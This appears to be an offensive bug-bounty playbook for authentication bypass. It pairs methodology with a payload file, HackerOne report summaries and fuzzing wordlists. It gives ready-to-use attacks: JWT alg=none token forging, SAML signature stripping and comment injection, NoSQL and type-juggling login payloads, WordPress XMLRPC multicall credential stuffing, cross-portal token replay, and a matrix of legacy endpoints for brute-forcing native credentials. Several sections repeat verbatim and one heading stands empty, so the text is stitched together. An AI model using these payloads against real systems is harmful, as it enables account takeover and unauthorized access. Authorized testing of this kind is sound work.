**Hardening reference:** [docs.duendesoftware.com/bff/fundamentals/session/handlers](https://docs.duendesoftware.com/bff/fundamentals/session/handlers/), [nestenius.se BFF cookie guide](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/), [Langkemper on `__Host-` prefix](https://www.sjoerdlangkemper.nl/2017/02/09/cookie-prefixes/).

### Attack class 3 — `/bff/user` claim disclosure

`GET /bff/user` returns the **full claim set** of the active session as a JSON array — `sub`, `sid`, `email`, `bff:session_expires_in`, `bff:session_state`, `bff:logout_url`, plus every custom claim the OP issued (department, role, internal employee ID, tenant ID). The endpoint is gated only by session cookie + `X-CSRF: 1`. If `AnonymousSessionResponse=Response200` is set, the endpoint also acts as a session probe (200 + claims vs 200 + `null`) usable as an auth-state oracle. Low/Medium info-disclosure on its own; valuable as recon for the YARP token-confusion class above. ([docs.duendesoftware.com/bff/fundamentals/session/management/user](https://docs.duendesoftware.com/bff/fundamentals/session/management/user/))

### Evidence strength + reporting tip

No Duende.BFF-direct CVE exists. The three classes are exploitable via real-world misconfigurations; CVE-2024-51987 and CVE-2025-26620 in the adjacent `Duende.AccessTokenManagement` packages make token-confusion a confirmed family. **Report by chain impact** (e.g., "low-priv session reaches admin-scope downstream API via UserOrClient route" → Critical) rather than by CVE citation, since the issue is design-level.

Cross-references for the chain:
- `csrf` — the role-partitioned antiforgery class (the CSRF angle on the same BFF surface).
- `subdomain-takeover` / `subdomain-takeover` — required primitive for the cookie-domain attack.

---

### Function-Level Access Control (Broken Authorization)

Authentication bypass gets you *in*; **function-level access control** failures let an already-authenticated low-privilege user reach privileged *functions* the UI never offered them. This is the authorization sibling of `idor` (object-level access) — test both whenever you hold any authenticated session.

**The sibling-function rule:** if 9 endpoints under a path enforce auth/role middleware, the 10th that doesn't is your bug. Admin route families are the highest-yield place to look:

```
/api/admin/users   → has auth middleware
/api/admin/export  → often MISSING it
/api/admin/delete  → often MISSING it
/api/admin/reset   → often MISSING it
```

**Anti-patterns to grep for:**
```javascript
// Missing middleware on a sibling route
router.get('/admin/users',  authenticate, authorize('admin'), getUsers);
router.get('/admin/export', getExport);            // No middleware!

// Client-side role check only — server never re-checks
if (user.role === 'admin') showAdminButton();      // frontend gate
app.post('/api/admin/delete', deleteUser);         // no server-side check
```

**How to hunt:** enumerate every privileged endpoint (admin/export/delete/reset/impersonate, GraphQL admin queries), then replay each from a *regular* authenticated session — and again with no session. A 200 (or a differential vs the 403 its siblings return) is broken function-level access control.

**Real paid example — HackerOne TrustHub:** `POST /graphql` with the `TrustHubQuery` operation had no authorization check — a regular user could read all vendors' data (CVSS 8.7, High). The object-level variant (e.g. a WebSocket `get_history` accepting an arbitrary UUID with no ownership check) belongs to `idor`.

---

### Legacy-Protocol Matrix (Probe These First on Any Custom-Branded Login)

When a target has a custom, branded login UI (e.g. `customlogin.aspx`, `/auth/signin`, `/account/login`), **always probe the platform's legacy protocol endpoints with native credentials** in parallel. These endpoints frequently outlive the custom UI's protections and accept native credentials with NO rate limit, NO MFA challenge, NO CAPTCHA, NO anti-automation. This is the WordPress XMLRPC pattern generalised across CMS / portal / framework stacks.

| Target tech | Legacy endpoint(s) to probe | Native-cred bypass surface |
|---|---|---|
| **WordPress** | `/xmlrpc.php` (`system.listMethods`, `wp.getUsersBlogs`, `system.multicall`) | Native WP user/pass; bypasses SSO, MFA, IP-allow rules on `/wp-login.php` |
| **WordPress (REST)** | `/?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users` | User enumeration anonymously even when login page is hardened |
| **SharePoint (any version)** | `/_vti_bin/Authentication.asmx` (`Mode` + `Login` SOAP ops) | Native Forms-auth credential; FedAuth cookie returned; no rate limit on this endpoint observed on SP2013 farms — **this is the canonical SP equivalent of the WP XMLRPC bypass** |
| **SharePoint legacy** | `/_vti_bin/_vti_aut/author.dll`, `/_vti_bin/_vti_adm/admin.dll`, `/_vti_bin/owssvr.dll` | FrontPage RPC; sometimes still wired to credential validators |
| **SharePoint REST** | `/_api/contextinfo` (POST), `/_api/$metadata` | Anonymous FormDigest issuance; full API surface enumeration |
| **Atlassian (Jira / Confluence)** | `/rest/auth/1/session` (basic-auth), `/rest/api/2/myself`, legacy `/rest/api/1.0/` | Native credentials accepted on `/rest/auth/1/session` even when Atlassian Crowd / Atlassian Access SSO is enforced on the UI |
| **Drupal** | `/jsonapi/`, `/user/login?_format=json` | JSON POST endpoint that accepts native passwords; separate from SSO middleware |
| **Drupal (D7 legacy)** | `/?q=user/login`, `/services/`, `/rest/` | Older REST modules with independent auth |
| **Joomla** | `/administrator/index.php?option=com_login`, `/api/index.php/v1/users` | Native Joomla credentials accepted on admin entry independent of any front-site SSO |
| **Exchange / OWA** | `/EWS/Exchange.asmx`, `/Autodiscover/Autodiscover.xml`, `/Microsoft-Server-ActiveSync` | NTLM / Basic; bypasses OWA UI restrictions (MFA, IP-allow). The classic CVE-2020-0688 / CVE-2021-26855 surface |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login`, `/nf/auth/doAuthentication.do` | Native AD credentials; independent of MFA wrappers |
| **F5 BIG-IP** | `/mgmt/tm/util/bash`, `/tmui/login.jsp` | Native admin credentials |
| **Generic ASP.NET app** | `*.asmx?WSDL`, `*.svc?WSDL`, `trace.axd`, `elmah.axd`, `.disco` | Find every web service; many take credentials independently of the WebForms login |
| **Spring Boot** | `/actuator/*`, `/management/*`, `/api/v1/auth/login`, `/api/v1/swagger-ui` | Actuator endpoints sometimes anonymously enumerable |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script`, `/manage`, `/computer/(master)/script` | API tokens + native auth |
| **GitLab** | `/api/v3/*` (deprecated but still on old installs), `/api/v4/users`, `/api/v4/projects` | Personal Access Tokens with looser scoping than UI session |
| **TeamCity** | `/app/rest/users`, `/login.html?username=&password=` (GET-form-login) | Native admin credentials |
| **Apache Tomcat** | `/manager/html`, `/host-manager/html`, `/manager/text/list` | Native Tomcat realm credentials independent of any front auth |
| **WebLogic** | `/console/login/LoginForm.jsp`, `/wls-wsat/*` | Native admin |
| **Oracle EBS / PeopleSoft** | `/OA_HTML/AppsLogin`, `/psp/*/?cmd=login` | Native ERP credentials |

**How to use:**
1. Identify the tech stack from headers + paths (use `hunt-misc` Attack Surface Signals).
2. Find the row above that matches.
3. Probe the legacy endpoint anonymously to confirm it's reachable and not 403/404.
4. Test with synthetic credentials to confirm it accepts native credential format and returns differential responses (success vs failure).
5. Verify there is no rate limit, no lockout, no CAPTCHA — burst 10 requests at the same user, confirm uniform timing.
6. Report as **Critical / High** depending on chain to ATO: an anonymous + unlimited credential brute-force endpoint is consistently Critical on bug-bounty programs.

**Lesson from a authorized engagement:** A an enterprise dealer portal on SharePoint 2013 had a custom branded `customlogin.aspx`. The hunt-auth-bypass skill was loaded but the matrix above did not exist in this document — and the WordPress XMLRPC pattern was not connected to the SharePoint equivalent. `/_vti_bin/Authentication.asmx` was reachable anonymously, accepted unlimited credential attempts with no rate limit and no lockout, and was the highest-impact finding in the engagement. Walking this matrix on the first pass would have surfaced it immediately.

---

### Duende BFF — Token-Confusion & Session-Fixation (2024-2026 surface)

Duende BFF deployments expose two distinct auth-bypass families beyond the CSRF angle covered in `hunt-csrf`. Both are documented architectural realities, not unicorn CVEs.

### Evidence strength + reporting tip

No Duende.BFF-direct CVE exists. The three classes are exploitable via real-world misconfigurations; CVE-2024-51987 and CVE-2025-26620 in the adjacent `Duende.AccessTokenManagement` packages make token-confusion a confirmed family. **Report by chain impact** (e.g., "low-priv session reaches admin-scope downstream API via UserOrClient route" → Critical) rather than by CVE citation, since the issue is design-level.

Cross-references for the chain:
- `hunt-csrf` — the role-partitioned antiforgery class (the CSRF angle on the same BFF surface).
- `hunt-subdomain-takeover` / `hunt-subdomain` — required primitive for the cookie-domain attack.

---

### Function-Level Access Control (Broken Authorization)

Authentication bypass gets you *in*; **function-level access control** failures let an already-authenticated low-privilege user reach privileged *functions* the UI never offered them. This is the authorization sibling of `hunt-idor` (object-level access) — test both whenever you hold any authenticated session.

**The sibling-function rule:** if 9 endpoints under a path enforce auth/role middleware, the 10th that doesn't is your bug. Admin route families are the highest-yield place to look:

```
/api/admin/users   → has auth middleware
/api/admin/export  → often MISSING it
/api/admin/delete  → often MISSING it
/api/admin/reset   → often MISSING it
```

**Anti-patterns to grep for:**
```javascript
// Missing middleware on a sibling route
router.get('/admin/users',  authenticate, authorize('admin'), getUsers);
router.get('/admin/export', getExport);            // No middleware!

// Client-side role check only — server never re-checks
if (user.role === 'admin') showAdminButton();      // frontend gate
app.post('/api/admin/delete', deleteUser);         // no server-side check
```

**How to hunt:** enumerate every privileged endpoint (admin/export/delete/reset/impersonate, GraphQL admin queries), then replay each from a *regular* authenticated session — and again with no session. A 200 (or a differential vs the 403 its siblings return) is broken function-level access control.

**Real paid example — HackerOne TrustHub:** `POST /graphql` with the `TrustHubQuery` operation had no authorization check — a regular user could read all vendors' data (CVSS 8.7, High). The object-level variant (e.g. a WebSocket `get_history` accepting an arbitrary UUID with no ownership check) belongs to `hunt-idor`.

---

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Auth Bypass — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- JWT -> `{"alg":"none"}`, HS256 with public key as secret, `kid=../../dev/null`

- NoSQL -> `{"user":"admin","pass":{"$ne":null}}`

- Type juggling -> `password[]=x`, `otp=0e12345`, `true` vs `"true"`

- Header tricks -> `X-Forwarded-Host: evil`, `Host: evil`, `X-Original-URL: /admin`



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 5× | `artifactory@r3.com` |

| 5× | `<userId>` |

| 4× | `url_match_auth_nego()` |

| 4× | `url_match_result()` |

| 4× | `ssh_config_matches()` |

| 3× | `abc@xyz.com` |

| 3× | `url_match_auth_ntlm()` |

| 3× | `support+1@trint.com` |

| 3× | `k->headerline` |

| 3× | `on_resp_header()` |

| 3× | `namevalue()` |

| 2× | `https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>` |

| 2× | `https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>` |

| 2× | `{"error": true, "errorMessage": "Invalid request"}` |

| 2× | `postPrivate()` |

| 2× | `badca7@wearehackerone.com` |

| 2× | `https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat` |

| 2× | `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register` |

| 2× | `GET → 404 {"status":404,"error":"Not Found"}` |

| 2× | `https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect` |



## Parameters observed



`client_id` · `redirect_uri` · `state` · `code` · `email` · `response_type` · `error` · `consumer_key` · `host` · `scope` · `id` · `auth_type` · `referrer` · `password` · `client_secret` · `type` · `return_to` · `auth_code` · `page` · `ws`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_auth-bypass.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_auth-bypass.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_auth-bypass.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_auth-bypass.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Default-login templates are high signal on admin panels; also test JWT and reset flows manually.



```sh

nuclei -u https://target -tags auth-bypass,default-login,jwt,login \

       -severity low,medium,high,critical -rl 40 -o nuclei_auth-bypass.txt

nuclei -u https://target -t ~/nuclei-templates/http/default-logins \

       -rl 40 -o nuclei_auth-bypass_default-logins.txt

nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \

       -rl 40 -o nuclei_auth-bypass_misconfiguration.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**XMLRPC auth probe (bypasses SSO):**

```bash

curl -s -X POST https://target.com/xmlrpc.php \

  -H "Content-Type: text/xml" \

  -d '<?xml version="1.0"?>

<methodCall>

  <methodName>system.listMethods</methodName>

  <params></params>

</methodCall>'



# If 200 with method list → XMLRPC is enabled, test auth:

curl -s -X POST https://target.com/xmlrpc.php \

  -H "Content-Type: text/xml" \

  -d '<?xml version="1.0"?>

<methodCall>

  <methodName>wp.getUsersBlogs</methodName>

  <params>

    <param><value><string>admin</string></value></param>

    <param><value><string>password</string></value></param>

  </params>

</methodCall>'

```



**SAML signature stripping (send unsigned assertion):**

```python

import base64, re



# Decode captured SAMLResponse

saml_b64 = "BASE64_FROM_BURP"

saml_xml = base64.b64decode(saml_b64).decode()



# Strip the Signature element entirely

stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)



# Re-encode and submit

print(base64.b64encode(stripped.encode()).decode())

```



**SAML XML comment injection (username confusion):**

```xml

<!-- Original NameID -->

<NameID>attacker@evil.com</NameID>



<!-- Injected to confuse parser -->

<NameID>attacker@evil.com<!---->.victim@company.com</NameID>



<!-- Or namespace confusion -->

<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>

```



**Partner/cross-portal token reuse test:**

```bash

# Get token from partner portal

TOKEN=$(curl -s -X POST https://partners.target.com/login \

  -d 'email=attacker@test.com&password=pass' \

  -c cookies.txt | grep -o 'token=[^;]*')



# Replay against admin portal

curl -s https://admin.target.com/dashboard \

  -H "Authorization: Bearer $TOKEN" \

  -H "Cookie: $TOKEN"

```



**JWT none algorithm attack:**

```python

import base64, json



header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')

payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')

token = f"{header}.{payload}."

print(token)

```



**Grep patterns for auth bypass surface:**

```bash

# Find XMLRPC in scope

grep -r "xmlrpc" scope_urls.txt



# Find SSO indicators in JS

grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js



# Find partner/admin subdomains

subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"

```



---

### Companion: hunting / references/techniques.md

# Auth Bypass — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Test password reset: token entropy, reuse, expiry, host-header poisoning, email enumeration.

- Attack JWT: alg=none, key confusion, weak secret, kid/jku injection, missing signature.

- Probe OAuth/SSO redirect_uri, state, nonce, and account-linking flows.

- Try type juggling and NoSQL/SQLi in login and OTP endpoints.

- Check registration verification: email/phone reuse, unicode normalization, duplicate identities.



## Bypass tricks



- Reset token leaked via Referer, shared cache, logs, or email link scanner.

- Response manipulation: change `success:false` to true, remove error checks.

- Case/unicode normalization of emails and usernames.

- Session fixation and missing token rotation after login.



## Deeper checklist



- Test password reset: token entropy, reuse, expiry, host-header poisoning, email enumeration, response leakage.

- Attack JWT: alg=none, key confusion, weak HMAC secret, kid/jku injection, missing signature checks.

- Probe OAuth/SSO flows for redirect_uri bypass, state CSRF, code reuse, and account linking flaws.

- Try SQLi/NoSQLi and type juggling in login and OTP endpoints.

- Test OTP: brute force limits, reuse, response leakage, race conditions, backup codes.

- Check registration for email/phone verification bypass and duplicate-identity handling.

- Test remember-me and session tokens for predictability, fixation, and missing revocation.

- Confirm you can access another account or a privileged area end-to-end.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password** — `#739737` · PayPal · $15,300 · ▲1409

  > https://medium.com/@alex.birsan/the-bug-that-exposed-your-paypal-password-539fc2896da9?sk=aeba33c3c331c3f06d230296a21a41e7

- **Improper Authentication - any user can login as other user with otp/logout & otp/login** — `#921780` · Snapchat · $0 · ▲972

  > - Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step.

- **Bypassing Digits origin validation which leads to account takeover** — `#129873` · X / xAI · $0 · ▲619

  > In short, the event origin is checked against Digits' origin in this line:`-1 !== this.config.get("sdk host").search(t.origin)`, which is the same as `-1 !== "https://www.digits.com".search(t.origin)`.

- **Flickr Account Takeover using AWS Cognito API** — `#1342088` · Flickr · $0 · ▲440

  > The `access token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:

- **Chained Bugs to Leak Victim's Uber's FB Oauth Token** — `#202781` · Uber · $0 · ▲427

  > Next, @ngalog found that the `https://login.uber.com/logout` endpoint would redirect based on the Referer header, making it possible to chain together another redirect.

- **URL link spoofing** — `#481472` · Slack · $250 · ▲362

  > Words such as `http://example.com` and `example.com` included in the message are displayed by URL link.

- **[cs.money] Open Redirect Leads to Account Takeover** — `#905607` · CS Money · $0 · ▲357

  > Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in…

- **Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)** — `#143717` · Uber · $0 · ▲312

  > Through the endpoint at /rt/users/passwordless-signup it is possible to change the password of any Uber user, given knowledge of their phone number (or by just enumerating phone numbers until one is found that is registered with Uber - not too hard given the…

- **Bypass Password Authentication for updating email and phone number - Security Vulnerability** — `#770504` · X / xAI · $0 · ▲288

  > {"flow token":"[PASTE FLOW TOKEN HERE]:1","status":"success","subtasks":[{"subtask id":"EnterPhoneForAssociation","enter phone":{"primary text":{"text":"Add a phone number","entities":[]},"secondary text":{"text":"Enter the phone number youâd like to…

- **Insufficient OAuth callback validation which leads to Periscope account takeover** — `#110293` · X / xAI · $0 · ▲277

  > callback url = a/../../login?redirect after login=https://cards.twitter.com/card id

- **Insufficient validation on Digits bridge** — `#168116` · X / xAI · $0 · ▲263

  > The problem is that there is a way for a website to disable sending Referer for out bound requests by using the tag `<meta name="referrer" content="never" `.

- **Ability to DOS any organization's SSO and open up the door to account takeovers** — `#976603` · Superhuman (formerly Grammarly) · $10,500 · ▲260

  > So if you have `myentity` as the legitimate entity, and an attacker sets their entity to `myentity[SPACE]` (with a space at the end); users attempting to authenticate into the legitimate `myentity` will technically authenticate against it, but then the…

- **Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties** — `#922456` · GitLab · $3,000 · ▲257

  > It's possible to play the `/oauth/authorize` request directly to bypass the `Verify the email address in your account profile before you sign in.` prompt.

- **Mass Account Takeover at https://app.taxjar.com/ - No user Interaction** — `#1581240` · Stripe · $0 · ▲253

  > The vulnerability was caused by a leaked token in the delete invitation request feature and resolved by using the invitation ID instead of the token to look up the user’s invite when deleting an invitation.

- **Improper Validation at Partners Login** — `#990048` · Eternal · $2,000 · ▲251

  > Our backend generated the OTP for `phone number` param but appended the `country isd` parameter to the `phone number` param before sending the SMS without any major checks.

- **Stealing SSO Login Tokens (snappublisher.snapchat.com)** — `#265943` · Snapchat · $7,500 · ▲244

  > `https://snappublisher.snapchat.com/api/v1/media/████/file/somthine.svg?%23pranav` this redirects with `307` status code to `storage.googleapis.com/creativesuite-prod-media/ ` with `SSO login token ticket` in ` hashfragment` carried forward by browser.

- **Incorrect authorization to the intelbot service leading to ticket information** — `#1328546` · TikTok · $15,000 · ▲219

  > An authentication bypass and site wide stored XSS (cross-site scripting) vulnerability was found on TikTok Ads as JWT (JSON Web Token) was not verified properly.

- **HackerOne Jira integration plugin Leaked JWT to unauthorized jira users** — `#1103582` · HackerOne · $3,000 · ▲213

  > When you click on "click here", you will be directed to a link this "`https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN `" containing JWT parameter to complete the integration process.

- **Mass Accounts Takeover Without any user Interaction  at https://app.taxjar.com/** — `#1685970` · Stripe · $0 · ▲212

  > The vulnerability was caused by manipulating the user's number in the POST request to `/accounts/<ACCOUNT NUMBER ` with adding the user's email parameter carrying the attacker's email in the payload data in the request, which causing changing the email in the…

- **2FA Bypass leads to  impersonation of legimate users** — `#2885636` · Drugs.com · $0 · ▲207

  > Go to https://www.drugs.com/account/register/ and create an account using an email you own.

- **H1514 [*.(my)shopify.com] - Viewing Password Protected Content** — `#421859` · Shopify · $3,000 · ▲192

  > Because of the `/preview bar`, the password protection is rendered useless.

- **Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com** — `#219205` · Uber · $0 · ▲183

  > Although there were some countermeasures to prevent theft, the current setup still allows leakage of these high-value session cookies to the overtaken subdomain https://saostatic.uber.com in all modern browsers, leading to a full Authentication Bypass (highly…

- **Account Takeover via Authentication Bypass in TikTok Account Recovery** — `#2443228` · TikTok · $12,000 · ▲172

  > I identified a critical vulnerability in one of TikTok's endpoints that permitted unauthorized changes to user accounts due to improper parameter handling.

- **Web Authentication Endpoint Credentials Brute-Force Vulnerability** — `#127844` · HackerOne · $0 · ▲161

  > The following successful brute-force attack of 10.001 passwords (https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k most common.txt appended with the real password) against test account ██████:Geniaal2!!

- **Absence of Token expiry leads to Unauthorized login Access** — `#766578` · Affirm · $0 · ▲155

  > When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.

- **H1514 Session Fixation on multiple shopify-built apps on *.shopifycloud.com and *.shopifyapps.com** — `#423136` · Shopify · $0 · ▲144

  > Attacker uses XSS on .shopifycloud.com and writes the cookie scoped to all subdomain to victim `document.cookie=' flow session=EVIL;domain=.shopifycloud.com;path=/';`

- **Open Redirect on central.uber.com allows for account takeover** — `#206591` · Uber · $0 · ▲144

  > When logging into `central.uber.com`, the `state` parameter for login.uber.com contained a redirect location instead of a CSRF token.

- **Attacker can obtain write access to any federated share/public link** — `#1170024` · Nextcloud · $4,000 · ▲142

  > For the sake of this example the `remote id = 2` and the `token = nOxdNJkb1xbI1VX`

- **Reading Emails in Uber Subdomains** — `#156536` · Uber · $0 · ▲141

  > Link to blog: http://blog.pentestnepal.tech/post/149985438982/reading-ubers-internal-emails-uber-bug-bounty

- **Mint Oauth2 access token for targeted user** — `#1148364` · GitLab · $5,580 · ▲140

  > `doorkeeper application%5Btrusted%5D=0&doorkeeper application%5Btrusted%5D=1& ` This will allow us to create an application that is trusted by default.



## Case studies



### Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password

`#739737` · PayPal · $15,300 · high · 2020-01-08 · ▲1409

> A bug was identified whereby sensitive, unique tokens were being leaked in a JS file used by the recaptcha implementation. In certain cases, a user must solve a CAPTCHA challenge after authenticating. When the security challenge is completed, the authentication request is replayed to log in. The exposed tokens were used in the POST request to solve the CAPTCHA.



### Improper Authentication - any user can login as other user with otp/logout & otp/login

`#921780` · Snapchat · $0 · critical · 2021-09-03 · ▲972

> '/scauth/otp/droid/logout' request contains user id parameter. Usually it is equal to current user user id, but if an attacker passes user id of victim account he can login as victim. I will demonstrate the problem on two accounts. Victim: ███ Attacker: ██████████ - Attacker perform a usuall login to attacker's personal account.



### Bypassing Digits origin validation which leads to account takeover

`#129873` · X / xAI · $0 · n/a · 2020-06-24 · ▲619

> Hi, I would like to report an important issue that affects websites that has integrated "Signin with Digits" , leading to potential account takeover. Detail In Digits architecture, the data communication channel between Digits and customer's site relies on postMessage() .



### Flickr Account Takeover using AWS Cognito API

`#1342088` · Flickr · $0 · critical · 2021-12-18 · ▲440

> Flickr uses Amazon Cognito to implement its login functionality. Furthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito User Pool API. Consider we have the following accounts: 1. flickr-benign@lauritz-holtmann.de (our victim) 2.



### Chained Bugs to Leak Victim's Uber's FB Oauth Token

`#202781` · Uber · $0 · high · 2019-01-25 · ▲427

> The Facebook OAuth application was misconfigured to allow any URL that followed the https://auth.uber.com/login? format to be provided as a redirect uri. By taking advantage of this, @ngalog was able to discover that the next url parameter could be added to the redirect uri allowing it to be chained further.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class auth-bypass --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class auth-bypass

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class auth-bypass

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class auth-bypass --min-bounty 1000

```



## Bypass Techniques



| Defense | Bypass |

|---|---|

| SSO enforced on login page | Probe alternate entry points: XMLRPC, REST API, mobile API, legacy endpoints |

| SAML signature validation | XML comment injection, namespace wrapping, signature wrapping (XSW), remove signature entirely |

| IP allowlisting on admin portal | Use partner portal token if it shares auth backend |

| Rate limiting on login | XMLRPC allows credential stuffing via `system.multicall` — batches hundreds of auth attempts in one request |

| CSRF token on login form | SAML flow is POST-based cross-origin by design; no CSRF token needed on `/saml/callback` |

| JWT signature validation | `alg: none`, key confusion (RS256 → HS256 with public key as secret), brute-force weak secrets |

| Separate session stores per portal | Check if cookie domain is `.target.com` (wildcard) — cookie bleeds between subdomains |

| MFA on primary login | If SAML SP doesn't enforce MFA at the assertion level and accepts pre-auth assertions, MFA can be skipped |



**XMLRPC multicall for mass auth bypass:**

```xml

<methodCall>

  <methodName>system.multicall</methodName>

  <params><param><value><array><data>

    <value><struct>

      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>

      <member><name>params</name><value><array><data>

        <value><string>admin</string></value>

        <value><string>password1</string></value>

      </data></array></value></member>

    </struct></value>

    <!-- repeat for each credential pair -->

  </data></array></value></param></params>

</methodCall>

```



---

## Corpus wordlists (mined)

### `params_auth-bypass.txt`

```text
error
client_id
redirect_uri
code
state
email
response_type
id
scope
authenticity_token
consumer_key
host
action
url
month
year
password
token
auth_type
template
username
referrer
type
phone
template[]
client_secret
usp
return_to
auth_code
_method
page
ws
message
name
oauth_token
nonce
ticket
shop
next
strategy
format
jwt
returnUrl
limit
utf8
Action
Version
x-amz-signedheaders
x-amz-credential
submit
uuid
getRankingInfo
facets
attributesToRetrieve
highlightPreTag
highlightPostTag
hitsPerPage
facetFilters
maxValuesPerFacet
x-algolia-agent
x-algolia-application-id
x-algolia-api-key
query
account
activity_pages
activity_filter
dir
comment_id
license_id
switch
ticket_id
tag
redirectUrl
redirect_after_login
x-amz-storage-class
proceed_to
ReturnUrl
signature
account_id
owner_id
offset
_x_id
rfhs
access_token
tix_email
lang
Sportsbook
sort
user_id
_csrf_token
secret_document
giftId
reset_password_token
AWSAccessKeyId
Signature
title
setlang
dest
x-app
x-urlpath
per_page
requestAtStart
requestAtStop
count
reason
cb
commit
MERGE1
MERGE2
ht
mc_signupsource
back_to
method
substate
is_internal
reference
add_reporter_to_original
reply_action
reports_count
dial_code
private
confirmation_token
is_sticky
track_id
session
requestTokenAndRedirect
challenge
challenge_answer
iframe
popup
player
product_id
cursor_index
cursor_offset
include_available_features
include_entities
is_forward
sk
attestation
device_id
dsig
dtoken1i
fidelius_client_init
height
max_video_height
max_video_width
reactivation_confirmed
req_token
screen_height_in
screen_height_px
```

### `paths_auth-bypass.txt`

```text
/login
/admin
/spf/validate.html
/oauth/authorize
/accounts/sso
/settings
/wp-login.php
/admin/
/cgi-bin/cvename.cgi
/signin
/bridge
/auth/shopify/
/cb
/gift/share/
/auth/failure
/scauth/otp/droid/logout
/redirect
/sso_continue
/accounts/login
/accounts/
/us/hosting/produktmatrix_vserver/vserver-produktmatrix
/vps.php
/pricing/
/api/v3/login/phone/
/login/oauth/authorize
/verify
/v2/auth.json
/bitcoinWithdrawalFees
/admin/products
/districts-demo-form
/customer/chats/new
/register/reset/
/dncp/home.php
/wp-json/newspack-extended-access/v1/google/register
/s/explore
/projects/
/api/auth
/api/v1/login
/CN=localhost
/web/scripts
/services/signup/setup
/Account/Login
/vendor/definitions
/vendor/Vendors
/server/employees
/squid-internal-mgr/active_requests
/dashboard
/accounts
/accounts/login/
/mattboldt/typed.js/master/lib/
/v2/_catalog
/wp-admin/
/path
/page1
/page2
/tools/keys.html
/%0d%0a
/admin/settings/notifications
/oauth/twitter/authorize
/my/account
/sockjs/info
/admin/settings/general
/slack-files2/
/subscribe/post
/callback
/security/advisory/
/forgot-password
/admin/users.json
/index.php/apps/files/
/musicstore/download
/_oauth/twitter/
/PinLetterConfirm.aspx
/login.cgi
/wp-admin/admin-ajax.php
/community
/check-otp
/stories/feed+rss
/safe/pickupfiles.aspx
/scauth/otp/login
/fabric.html
/de/cognito/
/cli/
/logout
/api/chat.postMessage
/rt/users/passwordless-signup
/pocs/periscope-oauth-callback-hijack
/web/digits/sign-in-with-phone-number.html
/pocs/digits-bridge-referer-bypass
/merchant-api/dining/merchant-login/v1/send-otp
/partners
/snaps/create/new
/vendors/1214355/hackerone
/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira
/account/details/
/account/register/
/preview_bar
/prepareuberattack.php
/trips
/articles/uber-turning-self-xss-into-good-xss/
/subdomaintakeoverbyarneswinnen.html
/uberattack.php
/Passwords
/ipv6/
/api/v2/users/1479-5770-XGGL
/api/v3/login/phone/SOMETOKEN
/auth/callback
